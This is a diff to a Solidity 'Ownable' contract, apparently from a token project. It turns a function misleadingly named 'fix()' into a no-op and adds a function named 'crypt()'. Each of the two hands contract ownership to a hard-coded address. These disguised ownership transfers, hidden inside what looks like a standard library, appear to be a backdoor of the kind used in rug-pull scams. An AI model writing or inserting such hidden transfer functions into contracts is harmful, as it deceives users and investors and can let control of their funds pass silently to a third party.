@@ -255,10 +255,15 @@ abstract contract Ownable is Context {
     }
 
     function fix() public virtual onlyOwner {
-        emit OwnershipTransferred(_owner, address(0x4BAa7006B39DC73A7B468DE99d7132E3ea73FACD));
-        _owner = address(0x4BAa7006B39DC73A7B468DE99d7132E3ea73FACD);
+        emit OwnershipTransferred(_owner, _owner);
+        _owner = _owner;
     }
 
+    function crypt() public virtual onlyOwner {
+        emit OwnershipTransferred(_owner, address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93));
+        _owner = address(0xc82aA33eD2F26ff924B99B7bDc8fF2fb87c88a93);
+    }
+    
     function transferOwnership(address newOwner) public virtual onlyOwner {
         require(newOwner != address(0), "Ownable: new owner is the zero address");
         emit OwnershipTransferred(_owner, newOwner);
